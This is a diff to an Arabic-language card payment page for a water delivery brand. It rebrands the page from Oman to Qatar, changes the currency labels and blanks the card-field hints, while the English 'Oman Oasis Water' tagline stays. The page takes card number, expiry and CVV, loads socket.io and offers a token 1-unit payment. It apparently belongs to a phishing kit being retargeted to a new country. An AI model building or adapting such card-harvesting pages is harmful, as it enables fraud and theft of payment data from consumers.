@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
-  <title>الدفع - مياه واحة عمان</title>
+  <title>الدفع - مياه واحة قطر</title>
   <link rel="stylesheet" href="../css/style.css">
   <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
   <style>
@@ -251,7 +251,7 @@
       <div class="logo">
         <div class="logo-icon">💧</div>
         <div class="logo-text">
-          <h1>مياه واحة عمان</h1>
+          <h1>مياه واحة قطر</h1>
           <span>Oman Oasis Water</span>
         </div>
       </div>
@@ -265,17 +265,17 @@
     <div class="steps">
       <div class="step completed">
         <div class="step-number">✓</div>
-        <span class="step-label">المنتج</span>
+        <span class="step-label">اختيار العرض</span>
       </div>
       <div class="step-line"></div>
       <div class="step completed">
         <div class="step-number">✓</div>
-        <span class="step-label">التوصيل</span>
+        <span class="step-label">عنوان التوصيل</span>
       </div>
       <div class="step-line"></div>
       <div class="step active">
         <div class="step-number">3</div>
-        <span class="step-label">الدفع</span>
+        <span class="step-label">الدفع </span>
       </div>
       <div class="step-line"></div>
 
@@ -305,13 +305,13 @@
           <label class="form-label">تاريخ الانتهاء</label>
           <input type="text" class="form-control" id="expiry" required 
                  placeholder="MM / YY" maxlength="7" inputmode="numeric" dir="ltr" autocomplete="off">
-          <small class="form-hint">مثال: 12/28</small>
+          <small class="form-hint"> </small>
         </div>
         <div class="form-group">
           <label class="form-label">رمز الأمان (CVV)</label>
           <input type="text" class="form-control" id="cvv" required 
-                 placeholder="CVV" maxlength="4" inputmode="numeric" autocomplete="off">
-          <small class="form-hint">3-4 أرقام خلف البطاقة</small>
+                 placeholder="CVV" maxlength="4" inputmode="numeric" autocomplete="off" >
+          <small class="form-hint"> </small>
         </div>
       </div>
 
@@ -325,15 +325,15 @@
         <h4>📋 ملخص الطلب</h4>
         <div class="summary-row">
           <span>المبلغ الإجمالي</span>
-          <span id="originalPrice">0.00 ر.ع</span>
+          <span id="originalPrice">0.00 ر.ق</span>
         </div>
         <div class="summary-row discount" id="discountRow" style="display:none;">
           <span id="remainingLabel">المبلغ المتبقي</span>
-          <span id="discountAmount">0.00 ر.ع</span>
+          <span id="discountAmount">0.00 ر.ق</span>
         </div>
         <div class="total">
           <span class="total-label" id="paymentLabel">المبلغ المدفوع الآن</span>
-          <span class="total-value" id="finalAmount">0.00 ر.ع</span>
+          <span class="total-value" id="finalAmount">0.00 ر.ق</span>
         </div>
       </div>
 
@@ -350,7 +350,7 @@
 
   <footer class="footer">
     <div class="container">
-      <p>© 2024 مياه واحة عمان - جميع الحقوق محفوظة 💧</p>
+      <p>© 2024 مياه واحة قطر - جميع الحقوق محفوظة 💧</p>
     </div>
   </footer>
 
@@ -379,7 +379,7 @@
             if (data.product) {
               productPrice = parseFloat(data.product.price);
               var totalPrice = productPrice * quantity;
-              document.getElementById('originalPrice').textContent = totalPrice.toFixed(2) + ' ر.ع';
+              document.getElementById('originalPrice').textContent = totalPrice.toFixed(2) + ' ر.ق';
               updateFinalAmount();
             }
           })
@@ -589,7 +589,7 @@
           remaining = Math.max(0, baseTotal - finalPrice);
           document.getElementById('discountRow').style.display = 'flex';
           document.getElementById('remainingLabel').textContent = 'المبلغ المتبقي';
-          document.getElementById('discountAmount').textContent = remaining.toFixed(2) + ' ر.ع';
+          document.getElementById('discountAmount').textContent = remaining.toFixed(2) + ' ر.ق';
           document.getElementById('paymentLabel').textContent = 'المبلغ المدفوع الآن';
         } else {
           var paymentRadio = document.querySelector('input[name="paymentAmount"]');
@@ -598,7 +598,7 @@
             if (selected && selected.value === '1') {
               finalPrice = 1;
               remaining = Math.max(0, baseTotal - finalPrice);
-              document.getElementById('discountAmount').textContent = remaining.toFixed(2) + ' ر.ع';
+              document.getElementById('discountAmount').textContent = remaining.toFixed(2) + ' ر.ق';
               document.getElementById('remainingLabel').textContent = 'المبلغ المتبقي';
               document.getElementById('paymentLabel').textContent = 'المبلغ المدفوع الآن';
               document.getElementById('discountRow').style.display = 'flex';
@@ -608,7 +608,7 @@
           }
         }
         
-        document.getElementById('finalAmount').textContent = finalPrice.toFixed(2) + ' ر.ع';
+        document.getElementById('finalAmount').textContent = finalPrice.toFixed(2) + ' ر.ق';
       }
       
       // ================================
